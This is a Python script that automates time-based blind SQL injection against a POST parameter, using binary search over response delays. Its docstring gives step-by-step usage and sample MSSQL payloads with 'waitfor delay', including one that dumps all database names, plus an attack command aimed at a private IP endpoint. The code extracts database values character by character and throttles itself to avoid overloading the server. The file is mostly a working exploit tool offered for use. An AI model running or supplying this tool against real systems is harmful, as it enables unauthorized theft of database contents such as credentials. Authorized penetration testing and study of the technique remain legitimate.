"""
A script to do TIME BASED SQLi.
-- Uses BINARY SEARCH to speed up the process.
-- Can be used against vulnerable parameters in a POST request body.
Note: If the wait time for success is too high, consider using straight.py
      straight.py does linear search.
      Linear search only require one truth response. Hence, if the true value requires long wait time, use straight.py

## Usage
```
usage: main.py [-h] [-u URL] [-d DATA_FILE] [-p PAYLOAD_FILE] [-m {int,char}]
               [-s STARTING_INDEX | --prefix PREFIX] [-e ENDING_INDEX] [-T THRESHOLD_TIME] [-V] [-t HEAT_WARNING]

optional arguments:
  -h, --help         show this help message and exit
  -u URL             Target url
  -d DATA_FILE       Request data file (POST request)
  -p PAYLOAD_FILE    Injection payload file
  -m {int,char}      Bruteforce mode (i=01..9, c=printable ascii, a=ab..z, A=AB..Z, l=alphanumeric)
  -s STARTING_INDEX  Start Index for char type
  --prefix PREFIX    Known starting of the value. This will override "-s"
  -e ENDING_INDEX    Ending index for char type
  -T THRESHOLD_TIME  Threshold time delay indicating success
  -V                 Re-validate after binary search (use this while retrieving info such as password)
  -t HEAT_WARNING    Time delay indicating heat up warning. The system will wait for "Threshold time delay (T) -
```

## How to use
1. Find the vulnerable end-point
2. Save the POST request body in request-body.txt
3. Replace the vulnerable parameter's value with <<$$inject$$>>
4. Find a working payload manually.
   For example:
        asd'; if (ascii(substring((select @@version),1,1))='M') waitfor delay '0:0:3'; select 'c
        <== If the database is MSSQL, the above payload will lead to a wait time of 3 seconds
5. Save the payload to payload.txt
6. Replace the bruteforce character with $$b$$
7. Replace the bruteforce index with $$i$$
8. Replace time delay value with $$T$$
9. Now the above payload looks like:
        asd'; if (ascii(substring((select @@version),$$i$$,1))=$$b$$) waitfor delay '0:0:$$T$$'; select 'c
10. Start the attack using the following command
    ```
    python3 main.py -u http://192.168.225.63:450/vulnerable-endpoint \
        -d request-body.txt \
        -p payload.txt \
        -T 3.0 \
        -t 2.0 \
        --prefix Microsoft
    ```

### What is the script doing?
    1. The script will replace =$$b$$ with inequalities such as >M and <M to perform binary search.
    2. The index ($$i$$) will be incremented to find next character.
    3. $$T$$ is replaced with the THRESHOLD_TIME (-T). If the wait time is greater that this value, success is assumed.
    4. If the time delay in the failure cases exceed HEAT_WARNING (-t), the script sleeps for a while to cool down the server.
       Note: HEAT_WARNING should be less than THRESHOLD_TIME
    5. If prefix is given, the value is assumed to begin with the prefix, $$i$$ is adjusted accordingly.

## TIP:
If you want to retrieve multiple values, first concatenate them and retrieve.
For example, following payload concatenates names of databases with a delimiter `~`
```
asd';
DECLARE @Value VARCHAR(8000);
SELECT @Value = COALESCE(@Value + '~', '') + name FROM sys.databases;
set @Value = @Value + '~~~';
if (ascii(substring(@Value,$$i$$,1))=$$b$$) waitfor delay '0:0:$$T$$'; --
```
This will retrieve something like
```
master~tempdb~model~msdb~appdb~~~
```

OR use LIMIT or TOP to find values one by one
"""




import threading

import requests
import argparse
import sys
import time
from urllib.parse import quote
from termcolor import colored


HEADERS = {
    'Content-Type': 'application/x-www-form-urlencoded'
}


class Options:
    url = ''
    post_body = ''
    payload = ''
    mode = 'c'
    starting_index = 1
    ending_index = 8000
    threshold_time = 5
    validate = False
    heat_warning = 3


ARGS = Options()

VALUE = ''
HOTTEST = 0


class CustomArgParser(argparse.ArgumentParser):
    def error(self, message):
        sys.stderr.write('error: %s\n' % message)
        self.print_help()
        sys.exit(2)

    @staticmethod
    def parse_input():
        parser = CustomArgParser()
        parser.add_argument('-u', help='Target url', dest='url')
        parser.add_argument('-d', help='Request data file (POST request)', dest='data_file')
        parser.add_argument('-p', help='Injection payload file', dest='payload_file')
        parser.add_argument('-m', help='Bruteforce mode (i=01..9, c=printable ascii, a=ab..z, A=AB..Z, l=alphanumeric)',
                            dest='mode', choices=['int', 'char'], default='c')
        start_group = parser.add_mutually_exclusive_group()
        start_group.add_argument('-s', help='Start Index for char type', dest='starting_index', type=int, default=1)
        start_group.add_argument('--prefix', help='Known starting of the value. '
                                                  'This will override "-s" ', dest='prefix', default='')
        parser.add_argument('-e', help='Ending index for char type', dest='ending_index', type=int, default=8000)
        parser.add_argument('-T', help='Threshold time delay indicating success', dest='threshold_time', type=float,
                            default=5.0)
        parser.add_argument('-V', help='Re-validate after binary search (use this while retrieving info such as'
                                       ' password', action='store_true', dest='validate')
        parser.add_argument('-t', help='Time delay indicating heat up warning. The system will wait for '
                                       '"Threshold time delay (T) - t"', dest='heat_warning', type=float, default=3.0)
        global ARGS
        ARGS = parser.parse_args()
        try:
            with open(ARGS.data_file, 'r') as data_file:
                ARGS.post_body = data_file.read()
            with open(ARGS.payload_file, 'r') as payload_file:
                ARGS.payload = payload_file.read().replace(';\n', ';').replace('\n', ' ')
            global VALUE
            VALUE += ARGS.prefix
            if len(VALUE) > 0:
                ARGS.starting_index = len(VALUE) + 1
        except Exception as e:
            parser.error("Input error")

        return ARGS


def substitute_payload(brute, index, sign='<='):
    payload = ARGS.payload.replace('=$$b$$', sign+str(brute))\
        .replace('$$i$$', str(index))\
        .replace('$$T$$', str(ARGS.threshold_time))
    print('[DEBUG] ' + payload)
    return ARGS.post_body.replace('<<$$inject$$>>', quote(payload))


def attempt(payload):
    global HOTTEST
    start = time.time()
    requests.post(ARGS.url, payload, headers=HEADERS)
    end = time.time()
    time.sleep(2)
    diff = end - start
    print('[DEBUG] ' + str(diff))
    success = diff > ARGS.threshold_time
    heat = diff - ARGS.threshold_time if success else diff
    HOTTEST = max(HOTTEST, heat)
    if heat > ARGS.heat_warning:
        print('[INFO ] Cooling down for %d(s).....' % (heat - ARGS.heat_warning))
        time.sleep(heat - ARGS.heat_warning)
    return success


def equal_to(brute, index):
    print('[DEBUG] ')
    print(colored('[DEBUG] Validating %s(%d)' % (chr(brute), brute), 'blue'))
    payload = substitute_payload(brute, index, '!=')
    return not attempt(payload)


def less_than_or_equal_to(brute, index):
    print('[DEBUG] ')
    print('[DEBUG] Binary searching')
    payload = substitute_payload(brute, index)
    return attempt(payload)


def binary_search(index):
    low = {
        'c': 32,
        'i': ord('0'),
        'a': ord('a'),
        'A': ord('A'),
        'l': ord('0')
    }[ARGS.mode]
    high = {
        'c': 126,
        'i': ord('9'),
        'a': ord('z'),
        'A': ord('Z'),
        'l': ord('z')
    }[ARGS.mode]
    mid = 0
    while low < high:
        mid = (high + low) // 2
        print('[INFO ] %s[%c(%d) - %c(%d) - %c(%d)]' % (VALUE, chr(low), low, chr(mid), mid, chr(high), high))
        if less_than_or_equal_to(mid, index):
            if mid == low:
                return low
            high = mid
        else:
            if mid == low:
                return high
            low = mid
    return ord('*')


def retrieve():
    global VALUE
    attempts = 0
    errors = 0
    for index in range(ARGS.starting_index, ARGS.ending_index):
        if VALUE.endswith('~~~'):
            print('[INFO ] Reached the end')
            break
        while True:
            print('')
            attempts += 1
            value = chr(binary_search(index))
            if (not ARGS.validate) or equal_to(ord(value), index):
                VALUE += value
                break
            else:
                errors += 1
                print(colored('[INFO ] Errors: %d    / attempts: %d' % (errors, attempts), 'red'))
                print(colored('[WARNING] Too hot! Cooling down for %f(s)' % ARGS.threshold_time, 'red'))
                time.sleep(ARGS.threshold_time)
                if attempts > 2 and errors / attempts > 0.5:
                    print(colored('[INFO ] Hottest: %f |    Error rate: %f' % (HOTTEST, errors / attempts), 'red'))
                    ARGS.threshold_time += 0.5
                    errors = 0
                    attempts = 0
                    print(colored('[WARNING] Too many errors! Increased threshold time to %f(s)' % ARGS.threshold_time,
                                  'red', None, ['bold']))
        print('[INFO ] ------------------------------')
        print(colored('[INFO ] Errors: %d    / attempts: %d' % (errors, attempts), 'cyan'))
        print(colored('[INFO ] Value till now: ' + VALUE, 'green'))
        print('[INFO ] ------------------------------')

    print('\n\n==================================')
    print(colored('Heat: (Warning, Highest, Threshold) - (%f, %f, %f)' % (ARGS.heat_warning, HOTTEST, ARGS.threshold_time), 'blue'))
    print(colored('Final Value: ' + VALUE, 'green', None, ['bold']))
    print('==================================')


def main():
    CustomArgParser.parse_input()
    retrieve()


if __name__ == '__main__':
    main()
